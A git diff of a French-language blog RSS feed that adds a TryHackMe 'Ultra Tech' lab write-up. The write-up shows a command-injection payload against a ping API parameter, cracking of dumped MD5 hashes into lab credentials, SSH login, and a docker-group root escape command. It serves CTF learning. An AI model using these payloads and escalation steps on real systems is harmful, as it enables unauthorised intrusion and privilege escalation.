@@ -7,7 +7,146 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>fr</language>
     <copyright>/home/rami_malek</copyright>
-    <lastBuildDate>Sat, 24 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 30 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>TryHackMe - Ultra Tech - Medium</title>
+      <link>/posts/thm-ultratech/</link>
+      <pubDate>Fri, 30 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/thm-ultratech/</guid>
+      <description>ultratech.thm Difficulty: Medium OS: Linux Description: The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing Link https://tryhackme.com/room/ultratech1 Note La partie &amp;ldquo;exploitation d&amp;rsquo;api&amp;rdquo; m&amp;rsquo;a bien plu même si le reste de la room est pas dingue dingue
+Je pense que c&amp;rsquo;est une des dernières room medium en web que j&amp;rsquo;vais faire, les prochaines seront hard
+Recon nmap -sC -sV -p- ultratech.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-27 20:07 CET Nmap scan report for ultratech.</description>
+      <content>&lt;h1 id=&#34;ultratechthm&#34;&gt;ultratech.thm&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Difficulty: Medium&lt;/li&gt;
+&lt;li&gt;OS: Linux&lt;/li&gt;
+&lt;li&gt;Description: &lt;code&gt;The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Link &lt;a href=&#34;https://tryhackme.com/room/ultratech1&#34;&gt;https://tryhackme.com/room/ultratech1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
+&lt;p&gt;La partie &amp;ldquo;exploitation d&amp;rsquo;api&amp;rdquo; m&amp;rsquo;a bien plu même si le reste de la room est pas dingue dingue&lt;/p&gt;
+&lt;p&gt;Je pense que c&amp;rsquo;est une des dernières room medium en web que j&amp;rsquo;vais faire, les prochaines seront &lt;strong&gt;hard&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;nmap -sC -sV -p- ultratech.thm&lt;/code&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-27 20:07 CET
+Nmap scan report for ultratech.thm (10.10.121.27)
+Host is up (0.071s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
+8081/tcp  open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=utf-8).
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 393.75 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Le &lt;strong&gt;nmap&lt;/strong&gt; a pris des années mais pour une fois il est intéressant. On a un &lt;strong&gt;ftp&lt;/strong&gt; sur le port &lt;strong&gt;21&lt;/strong&gt;, une &lt;strong&gt;API Express&lt;/strong&gt; qui tourne sur le &lt;strong&gt;port 8081&lt;/strong&gt;, puis un &lt;strong&gt;serveur http&lt;/strong&gt; sur le port &lt;strong&gt;31331&lt;/strong&gt; (pourquoi?)&lt;/p&gt;
+&lt;p&gt;La page d&amp;rsquo;accueil du site ressemble à ça:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016462-06634d12-951a-4ac6-adcb-5c8495c89473.png&#34; alt=&#34;2022-12-27-222148_934x1028_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;/robots.txt&lt;/strong&gt; nous montre qu&amp;rsquo;il existe un &lt;strong&gt;utech_sitemap.txt&lt;/strong&gt;. En s&amp;rsquo;y rendant, on découvre la page &lt;strong&gt;/partner.html&lt;/strong&gt; (partie franchement inutile de la room).&lt;/p&gt;
+&lt;p&gt;On va sur le &lt;strong&gt;/partner&lt;/strong&gt; puis on ouvre devtools, et on voit ceci das le &lt;strong&gt;network&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016482-8e85173c-5805-4323-8770-8019467d7600.png&#34; alt=&#34;2022-12-27-222407_945x204_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Toutes les &lt;code&gt;?&lt;/code&gt; secondes, le site fait une requête vers  son &lt;strong&gt;port 8081&lt;/strong&gt;: L&amp;rsquo;&lt;strong&gt;Api Express&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016506-04d51595-f13a-4abd-b2ed-fc23e5d52da9.png&#34; alt=&#34;2022-12-27-223057_350x44_scrot&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;foothold-command-injection-on-api&#34;&gt;Foothold (Command injection on API)&lt;/h1&gt;
+&lt;p&gt;En se rendant sur &lt;code&gt;ultratech.thm:8081/ping&lt;/code&gt;, le site nous retourne &amp;ldquo;&lt;strong&gt;name or service not known&lt;/strong&gt;&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;A piori, l&amp;rsquo;api éxecute localement un &lt;strong&gt;ping&lt;/strong&gt; en fonction du paramètre qu&amp;rsquo;on lui donne, ce qui expliquerait pourquoi ça n&amp;rsquo;a pas fonctionné: le site n&amp;rsquo;a pas &lt;code&gt;ultratech.thm&lt;/code&gt; dans son &lt;strong&gt;/etc/hosts&lt;/strong&gt; et donc la commande ne peut pas fonctionner&lt;/p&gt;
+&lt;p&gt;Pour s&amp;rsquo;assurer de ça, on peut remplacer le paramètre &lt;code&gt;ip&lt;/code&gt; par &lt;strong&gt;127.0.0.1&lt;/strong&gt; (une ip que le serveur connaît) pour voir si ça fonctionne:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016520-c8ea14f3-233a-4c96-ab19-30818d1decd8.png&#34; alt=&#34;2022-12-27-223617_1891x159_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Et on voit bien que la commande fonctionne. On peut donc partir sur une &lt;strong&gt;command injection&lt;/strong&gt; avec un payload assez simple:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ip=127.0.0.1;`ls` &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016543-526bcee9-1892-4a39-80da-900a8e3b9d08.png&#34; alt=&#34;2022-12-27-224455_668x131_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On voit un seul fichier: &lt;code&gt;utech.db.sqlite&lt;/code&gt;. On va utiliser la commande &lt;strong&gt;cat&lt;/strong&gt; pour lire son contenu&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016554-c9308d02-4c37-47b5-8c00-7f42f2948321.png&#34; alt=&#34;2022-12-27-224513_1268x132_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On a quelque chose qui ressemble à des identifiants, on va tenter de crack les hash que ça nous a donné:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;r00t:f357a0c52799563c7c7b76c1e7543a32&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin:0d0ea5111e3c1def594c1684e3b9be84&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On va tester avec &lt;a href=&#34;https://crackstation.net&#34;&gt;https://crackstation.net&lt;/a&gt; et le premier hash (md5)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016592-1425a0a3-d70d-4be7-ade4-9d029b505db4.png&#34; alt=&#34;2022-12-27-225254_1031x66_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On a le mot de passe de &lt;code&gt;r00t&lt;/code&gt;:&lt;code&gt;n100906&lt;/code&gt; qu&amp;rsquo;on  va utiliser pour se ssh&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssh r00t@ultratech.thm&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016606-af809307-4fbd-45b0-a9d3-553752867220.png&#34; alt=&#34;2022-12-27-225416_894x825_scrot&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;privilege-escalation-via-docker-escape&#34;&gt;Privilege escalation (via Docker Escape)&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt; ne nous retourne rien, on va chercher si certaines files on le SUID bit&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/gpasswd
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/fusermount
+/bin/umount
+/snap/core/6350/bin/mount
+/snap/core/6350/bin/ping
+/snap/core/6350/bin/ping6
+/snap/core/6350/bin/su
+/snap/core/6350/bin/umount
+/snap/core/6350/usr/bin/chfn
+/snap/core/6350/usr/bin/chsh
+/snap/core/6350/usr/bin/gpasswd
+/snap/core/6350/usr/bin/newgrp
+/snap/core/6350/usr/bin/passwd
+/snap/core/6350/usr/bin/sudo
+/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6350/usr/lib/openssh/ssh-keysign
+/snap/core/6350/usr/lib/snapd/snap-confine
+/snap/core/6350/usr/sbin/pppd
+/snap/core/6531/bin/mount
+/snap/core/6531/bin/ping
+/snap/core/6531/bin/ping6
+/snap/core/6531/bin/su
+/snap/core/6531/bin/umount
+/snap/core/6531/usr/bin/chfn
+/snap/core/6531/usr/bin/chsh
+/snap/core/6531/usr/bin/gpasswd
+/snap/core/6531/usr/bin/newgrp
+/snap/core/6531/usr/bin/passwd
+/snap/core/6531/usr/bin/sudo
+/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6531/usr/lib/openssh/ssh-keysign
+/snap/core/6531/usr/lib/snapd/snap-confine
+/snap/core/6531/usr/sbin/pppd
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Rien d&amp;rsquo;intéressant sur ça, on va donc tenter de run &lt;code&gt;linpeas&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016630-6bb2f827-441f-44f0-940f-a87590eb657d.png&#34; alt=&#34;2022-12-27-230610_964x187_scrot&#34;&gt;
+&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016643-7f064b39-5a25-4dd5-a031-b9a6e98c7639.png&#34; alt=&#34;2022-12-27-230648_968x209_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Dès que je le lance je me rends compte que j&amp;rsquo;ai complètement oublié de faire un &lt;code&gt;id&lt;/code&gt; 🤡 et je vois que l&amp;rsquo;utilisateur &lt;code&gt;r00t&lt;/code&gt; est dans le groupe docker&lt;/p&gt;
+&lt;p&gt;On peut donc utiliser la commande &lt;code&gt;docker image list&lt;/code&gt; pour voir les images docker sur le serveur&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+bash                latest              495d6437fc1e        3 years ago         15.8MB
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Puis on utilise cette commande pour s&amp;rsquo;escape du docker:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;docker run -v /:/mnt --rm -it bash chroot /mnt sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/210016657-8a39b52b-0591-4a5e-ac84-db7c020c0dc8.png&#34; alt=&#34;2022-12-27-233728_1222x98_scrot&#34;&gt;&lt;/p&gt;
+&lt;p&gt;gg !&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>TryHackMe - Anonymous - Medium</title>
       <link>/posts/thm-anonymous/</link>
@@ -1112,7 +1251,7 @@ Vous pouvez aussi regarder mon github mais je doute qu&amp;rsquo;il y ait quoi q
       
       <guid>/posts-list/</guid>
       <description>Liste des différents writeups que vous pourrez retrouver ici
-Try Hack Me mr-robot-ctf.thm (medium) wonderland.thm (medium) dogcat.thm (medium) anonymous.thm (medium) madeyes-castle.thm (medium) Hack The Box none
+Try Hack Me mr-robot-ctf.thm (medium) wonderland.thm (medium) dogcat.thm (medium) anonymous.thm (medium) ultratech.thm (medium) madeyes-castle.thm (medium) Hack The Box none
 Other NahamCon CTF 2022 Writeups </description>
       <content>&lt;p&gt;Liste des différents writeups que vous pourrez retrouver ici&lt;/p&gt;
 &lt;h1 id=&#34;try-hack-me&#34;&gt;Try Hack Me&lt;/h1&gt;
@@ -1121,6 +1260,7 @@ Other NahamCon CTF 2022 Writeups </description>
 &lt;li&gt;&lt;a href=&#34;/posts/thm-wonderland&#34;&gt;wonderland.thm&lt;/a&gt; (medium)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;/posts/thm-dogcat&#34;&gt;dogcat.thm&lt;/a&gt; (medium)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;/posts/thm-anonymous&#34;&gt;anonymous.thm&lt;/a&gt; (medium)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/posts/thm-ultratech&#34;&gt;ultratech.thm&lt;/a&gt; (medium)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;/posts/thm-madeyes&#34;&gt;madeyes-castle.thm&lt;/a&gt; (medium)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h1 id=&#34;hack-the-box&#34;&gt;Hack The Box&lt;/h1&gt;
